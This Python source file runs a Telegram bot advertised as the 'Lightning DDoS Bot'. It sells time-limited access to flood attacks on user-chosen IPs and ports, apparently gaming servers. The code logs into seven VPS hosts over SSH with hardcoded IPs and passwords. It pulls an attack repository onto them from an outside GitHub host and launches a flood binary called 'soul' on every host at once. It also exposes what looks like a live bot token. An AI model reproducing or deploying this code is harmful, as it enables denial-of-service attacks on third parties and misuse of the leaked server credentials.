import telebot
from telebot import types
import datetime
import os
import time
import logging
import re
from collections import defaultdict
import subprocess
from threading import Timer, Lock
import json
import atexit
import asyncio
import threading
import paramiko

logging.basicConfig(level=logging.INFO)

MAX_ATTACK_DURATION = 240
USER_ACCESS_FILE = "user_access.txt"
ATTACK_LOG_FILE = "attack_log.txt"
OWNER_ID = "6442837812"
bot = telebot.TeleBot('7507720145:AAGQ2ZQ3l60UAoKKIIKcUA7fZQuod-w5rhA')

vps_list = [
    {"ip": "65.20.70.198", "user": "master_mbnctmgpjj", "pass": "jssZ92MddczG"},
    {"ip": "157.245.106.235", "user": "master_sympfvcjnr", "pass": "j983URh4HZDK"},
    {"ip": "159.65.155.247", "user": "master_yydznrgycm", "pass": "xPg9tbtjfnE2"},
    {"ip": "143.110.181.25", "user": "master_kyzpmyacyh", "pass": "BvTwxDPF3jCd"},
    {"ip": "64.227.164.0", "user": "master_ajtsdszfcj", "pass": "DJcMV2MFQ33y"},
    {"ip": "64.227.167.67", "user": "master_vqqahptdae", "pass": "48zuz4AZ3XTR"},
    {"ip": "139.59.63.135", "user": "master_cznykhvwqj", "pass": "jzk66JcCrYW7"}
]

def deploy_single_vps(vps):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=20)
        clone_cmd = "git clone https://github.com/SagarExe/Clodways.git \~/Clodways 2>/dev/null || (cd \~/Clodways && git pull)"
        chmod_cmd = "cd \~/Clodways && chmod +x *"
        ssh.exec_command(clone_cmd)
        time.sleep(8)
        ssh.exec_command(chmod_cmd)
        ssh.close()
        logging.info(f"✅ Deployed/Updated Clodways on {vps['ip']}")
    except Exception as e:
        logging.error(f"Deploy error on {vps['ip']}: {e}")

def deploy_to_all_vps():
    for vps in vps_list:
        threading.Thread(target=deploy_single_vps, args=(vps,)).start()

deploy_to_all_vps()

def remote_execute(vps, target, port, duration):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=10)
        command = f"cd \~/Clodways && nohup timeout {duration}s ./soul {target} {port} {duration} 900 > /dev/null 2>&1 &"
        ssh.exec_command(command)
        ssh.close()
    except Exception as e:
        logging.error(f"SSH Error on {vps['ip']}: {e}")

def load_user_access():
    try:
        with open(USER_ACCESS_FILE, "r") as file:
            access = {}
            for line in file:
                parts = line.strip().split(",")
                if len(parts) >= 3:
                    user_id, expiration = parts[0], parts[-1]
                elif len(parts) == 2:
                    user_id, expiration = parts
                else:
                    continue
                try:
                    access[user_id] = datetime.datetime.fromisoformat(expiration)
                except ValueError:
                    logging.error(f"Invalid expiration format for user {user_id}")
            return access
    except Exception as e:
        logging.error(f"Error loading user access: {e}")
        return {}

feedback_count = {}
feedback_sent_time = {}
feedback_received = {}

attack_limits = {}
user_cooldowns = {}
active_attacks = []
user_command_count = defaultdict(int)
last_command_time = {}
attacks_lock = Lock()

def save_persistent_data():
    data = {'attack_limits': attack_limits, 'user_cooldowns': user_cooldowns}
    with open('persistent_data.json', 'w') as f:
        json.dump(data, f)

def load_persistent_data():
    try:
        with open('persistent_data.json', 'r') as f:
            data = json.load(f)
            attack_limits.update(data.get('attack_limits', {}))
            user_cooldowns.update(data.get('user_cooldowns', {}))
    except FileNotFoundError:
        pass

atexit.register(save_persistent_data)

def send_final_message(attack):
    with attacks_lock:
        if attack in active_attacks:
            active_attacks.remove(attack)
    save_active_attacks()

def load_active_attacks():
    global active_attacks
    try:
        with open('active_attacks.json', 'r') as f:
            attacks = json.load(f)
            for attack in attacks:
                attack['end_time'] = datetime.datetime.fromisoformat(attack['end_time'])
                remaining = (attack['end_time'] - datetime.datetime.now()).total_seconds()
                if remaining > 0:
                    with attacks_lock:
                        active_attacks.append(attack)
                    Timer(remaining, send_final_message, [attack]).start()
    except FileNotFoundError:
        pass

def save_active_attacks():
    with attacks_lock:
        attacks_to_save = [{
            'user_id': a['user_id'],
            'target': a['target'],
            'port': a['port'],
            'end_time': a['end_time'].isoformat(),
            'message_id': a.get('message_id')
        } for a in active_attacks]
    with open('active_attacks.json', 'w') as f:
        json.dump(attacks_to_save, f)

async_loop = asyncio.new_event_loop()
def start_async_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

threading.Thread(target=start_async_loop, args=(async_loop,), daemon=True).start()

def save_user_access():
    temp_file = f"{USER_ACCESS_FILE}.tmp"
    try:
        with open(temp_file, "w") as file:
            for user_id, expiration in user_access.items():
                file.write(f"{user_id},{expiration.isoformat()}\n")
        os.replace(temp_file, USER_ACCESS_FILE)
    except Exception as e:
        logging.error(f"Error saving user access: {e}")

def log_attack(user_id, target, port, duration):
    try:
        with open(ATTACK_LOG_FILE, "a") as log_file:
            log_file.write(f"{datetime.datetime.now()}: User {user_id} attacked {target}:{port} for {duration} seconds.\n")
    except Exception as e:
        logging.error(f"Error logging attack: {e}")

def is_valid_ip(ip):
    return re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip) is not None

def is_rate_limited(user_id):
    now = datetime.datetime.now()
    cooldown = user_cooldowns.get(user_id, 300)
    if user_id in last_command_time and (now - last_command_time[user_id]).seconds < cooldown:
        user_command_count[user_id] += 1
        return user_command_count[user_id] > 3
    else:
        user_command_count[user_id] = 1
        last_command_time[user_id] = now
    return False

def is_authorized(message):
    if str(message.from_user.id) == OWNER_ID:
        return True
    now = datetime.datetime.now()
    chat_id = str(message.chat.id)
    user_id = str(message.from_user.id)
    if message.chat.type in ["group", "supergroup"]:
        if chat_id in user_access and user_access[chat_id] >= now:
            return True
        if user_id in user_access and user_access[user_id] >= now:
            return True
        return False
    else:
        if user_id in user_access and user_access[user_id] >= now:
            return True
        return False

user_access = load_user_access()
load_persistent_data()
load_active_attacks()

async def async_update_countdown(message, msg_id, start_time, duration, caller_id, target, port, attack_info):
    end_time = start_time + datetime.timedelta(seconds=duration)
    loop = asyncio.get_running_loop()
    while True:
        remaining = (end_time - datetime.datetime.now()).total_seconds()
        if remaining <= 0:
            break
        try:
            await loop.run_in_executor(None, lambda: bot.edit_message_caption(
                chat_id=message.chat.id,
                message_id=msg_id,
                caption=f"""
⚡️🔥 ATTACK DEPLOYED 🔥⚡️

👑 Commander: `{caller_id}`
🎯 Target Locked: `{target}`
📡 Port Engaged: `{port}`
⏳ Time Remaining: `{int(remaining)} seconds`
⚔️ Weapon: `BGMI Protocol`
🔥 The attack is in progress... 🔥
                """,
                parse_mode='Markdown'
            ))
        except Exception as e:
            logging.error(f"Async countdown update error: {e}")
        await asyncio.sleep(1)
    try:
        await loop.run_in_executor(None, lambda: bot.edit_message_caption(
            chat_id=message.chat.id,
            message_id=msg_id,
            caption=f"""
✅ ATTACK COMPLETED ✅
🎯 Target: `{target}`
📡 Port: `{port}`
⏳ Duration: `{duration} seconds`
🔥 Attack finished successfully! 🔥
                """,
            parse_mode='Markdown'
        ))
    except Exception as e:
        logging.error(f"Async final message error: {e}")
    with attacks_lock:
        if attack_info in active_attacks:
            active_attacks.remove(attack_info)
    save_active_attacks()

def ask_attack_feedback(user_id, chat_id):
    markup = types.InlineKeyboardMarkup()
    hit_button = types.InlineKeyboardButton("✅ Hit", callback_data=f"feedback_hit_{user_id}")
    not_hit_button = types.InlineKeyboardButton("❌ Not Hit", callback_data=f"feedback_not_{user_id}")
    stop_button = types.InlineKeyboardButton("⏹ Stop Attack", callback_data=f"feedback_stop_{user_id}")
    markup.row(hit_button, not_hit_button)
    markup.add(stop_button)
    msg = bot.send_message(
        chat_id,
        f"<a href='tg://user?id={user_id}'>User</a>, did your attack hit?",
        parse_mode="HTML",
        reply_markup=markup
    )
    feedback_sent_time[user_id] = time.time()

@bot.callback_query_handler(func=lambda call: call.data.startswith("feedback_"))
def handle_feedback(call):
    data = call.data.split("_")
    if call.data.startswith("feedback_stop_"):
        expected_user_id = data[2]
        if str(call.from_user.id) != expected_user_id and str(call.from_user.id) != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ You are not authorized to stop this attack.")
            return
        attack_to_stop = None
        for attack in active_attacks:
            if attack['user_id'] == expected_user_id:
                attack_to_stop = attack
                break
        if not attack_to_stop:
            bot.answer_callback_query(call.id, "No running attack found.")
            return
        proc = attack_to_stop.get("proc")
        if proc:
            try:
                proc.terminate()
            except Exception as e:
                logging.error(f"Error stopping process: {e}")
        with attacks_lock:
            if attack_to_stop in active_attacks:
                active_attacks.remove(attack_to_stop)
        save_active_attacks()
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="Attack stopped."
            )
        except Exception as e:
            logging.error("Error editing message after stopping attack: " + str(e))
        bot.answer_callback_query(call.id, "Attack stopped.")
        return
    feedback = data[1]
    expected_user_id = data[2]
    if feedback_received.get(expected_user_id, False):
        bot.answer_callback_query(call.id, "Feedback already received.")
        return
    if str(call.from_user.id) != expected_user_id and str(call.from_user.id) != OWNER_ID:
        bot.answer_callback_query(call.id, "❌ You are not authorized to provide feedback for this attack.")
        return
    current_time = time.time()
    sent_time = feedback_sent_time.get(expected_user_id)
    if sent_time and (current_time - sent_time > 60):
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="Feedback time expired. Please provide timely feedback next time."
        )
        bot.answer_callback_query(call.id, "Feedback time expired.")
        return
    global feedback_count
    if feedback == "not":
        feedback_count[expected_user_id] = feedback_count.get(expected_user_id, 0) + 1
        if feedback_count[expected_user_id] >= 7:
            upload_new_binary()
            feedback_count[expected_user_id] = 0
            result_text = "Repeated negative feedback detected. New binary compiled and uploaded."
        else:
            result_text = f"Negative feedback recorded ({feedback_count[expected_user_id]}/7)."
    else:
        feedback_count[expected_user_id] = 0
        result_text = "Great! Feedback noted."
    feedback_received[expected_user_id] = True
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"Feedback received: {'Hit' if feedback == 'hit' else 'Not Hit'}"
        )
    except Exception as e:
        logging.error("Error editing feedback message: " + str(e))
    bot.answer_callback_query(call.id, result_text)

def get_next_binary_name():
    files = os.listdir('.')
    binary_numbers = []
    for f in files:
        if f.isdigit():
            try:
                binary_numbers.append(int(f))
            except ValueError:
                continue
    if binary_numbers:
        next_num = max(binary_numbers) + 1
    else:
        next_num = 1
    return str(next_num)

def upload_new_binary():
    try:
        compile_command = "gcc tester.c -o temp_binary"
        subprocess.check_call(compile_command, shell=True)
        next_binary = get_next_binary_name()
        os.rename("temp_binary", next_binary)
        os.chmod(next_binary, 0o755)
        if os.path.islink("soul") or os.path.exists("soul"):
            os.remove("soul")
        os.symlink(next_binary, "soul")
        logging.info(f"New binary {next_binary} compiled and uploaded successfully.")
    except Exception as e:
        logging.error(f"Error compiling new binary: {e}")

@bot.message_handler(commands=['deploy'])
def deploy_command(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can deploy.")
        return
    bot.reply_to(message, "🚀 Deploying Clodways repo + chmod +x * to all VPS...")
    deploy_to_all_vps()
    bot.reply_to(message, "✅ Deployment started on all VPS.")

@bot.message_handler(commands=['stop_all'])
def stop_all_command(message):
    caller_id = str(message.from_user.id)
    if caller_id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can stop all attacks.")
        return
    stopped = 0
    with attacks_lock:
        for attack in active_attacks:
            proc = attack.get("proc")
            if proc:
                try:
                    proc.terminate()
                    stopped += 1
                except Exception as e:
                    logging.error(f"Error stopping process: {e}")
        active_attacks.clear()
    save_active_attacks()
    bot.reply_to(message, f"✅ Stopped {stopped} running attack(s).")

@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_message = """
🌟 Welcome to the Lightning DDoS Bot!

⚡️ With this bot, you can:
- Check your subscription status.
- Simulate powerful attacks responsibly.
- Manage access and commands efficiently.

🚀 Use /help to see the available commands and get started!

🛡️ For assistance, contact tg = @skyline_offficial
         owner = @wtf_vai

Note: Unauthorized access is prohibited. Contact an admin if you need access.
    """
    bot.reply_to(message, welcome_message, parse_mode='HTML')

@bot.message_handler(commands=['bgmi', 'attack'])
def handle_bgmi(message):
    if not is_authorized(message):
        bot.reply_to(message, "❌ You are not authorized to use this bot or your access has expired. Please contact an admin.")
        return
    caller_id = str(message.from_user.id)
    command = message.text.split()
    if len(command) != 4 or not command[3].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/bgmi <target> <port> <duration>`", parse_mode='Markdown')
        return
    target, port, duration = command[1], command[2], int(command[3])
    if not is_valid_ip(target):
        bot.reply_to(message, "❌ Invalid target IP! Please provide a valid IP address.")
        return
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        bot.reply_to(message, "❌ Invalid port! Please provide a port number between 1 and 65535.")
        return
    int_port = int(port)
    BLOCKED_PORTS = {17000, 17500, 20000, 20001, 20002}
    if int_port <= 10000 or int_port >= 30000 or int_port in BLOCKED_PORTS:
         bot.reply_to(message, f"🚫 The port `{int_port}` is blocked! Please use a different port.")
         return
    if duration > MAX_ATTACK_DURATION:
        bot.reply_to(message, f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.")
        return
    if caller_id in attack_limits and duration > attack_limits[caller_id]:
        bot.reply_to(message, f"⚠️ Your maximum allowed attack duration is {attack_limits[caller_id]} seconds.")
        return
    current_active = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
    if len(current_active) >= 1:
        bot.reply_to(message, "🚨 Maximum of 1 concurrent attack allowed. Please wait for the current attack to finish before launching a new one.")
        return
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    attack_info = {'user_id': caller_id, 'target': target, 'port': port, 'end_time': attack_end_time}
    bot.send_message(
        message.chat.id,
        f"🚀 **Broadcasting to {len(vps_list)} VPS**\n🎯 Target: `{target}`\n📡 Port: `{port}`\n⏳ Duration: `{duration} seconds`",
        parse_mode='Markdown'
    )
    for vps in vps_list:
        threading.Thread(target=remote_execute, args=(vps, target, port, duration)).start()
    log_attack(caller_id, target, port, duration)
    msg = bot.send_animation(
        chat_id=message.chat.id,
        animation="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjR3ZHI1YnQ1bHU4OHBqN2I2M3N2eDVpdG8wNndjaDVvNXoyZDB3aSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/SsBz0oSJ1botYaLqAR/giphy.gif",
        caption=f"""
⚡️🔥 ATTACK DEPLOYED 🔥⚡️

👑 Commander: `{caller_id}`
🎯 Target Locked: `{target}`
📡 Port Engaged: `{port}`
⏳ Time Remaining: `{duration} seconds`
⚔️ Weapon: `BGMI Protocol`
🔥 The wrath is unleashed. May the network shatter! 🔥
        """,
        parse_mode='Markdown'
    )
    attack_info['message_id'] = msg.message_id
    with attacks_lock:
        active_attacks.append(attack_info)
    save_active_attacks()
    asyncio.run_coroutine_threadsafe(
        async_update_countdown(message, msg.message_id, datetime.datetime.now(), duration, caller_id, target, port, attack_info),
        async_loop
    )
    ask_attack_feedback(caller_id, message.chat.id)

# ... (all other handlers: update_binary, when, help, grant, revoke, attack_limit, list_users, backup, download_backup, set_cooldown, status remain exactly the same as previous full version)

while True:
    try:
        bot.polling(none_stop=True, interval=0, allowed_updates=["message", "callback_query"])
    except Exception as e:
        logging.error(f"Polling error: {e}")
        time.sleep(5)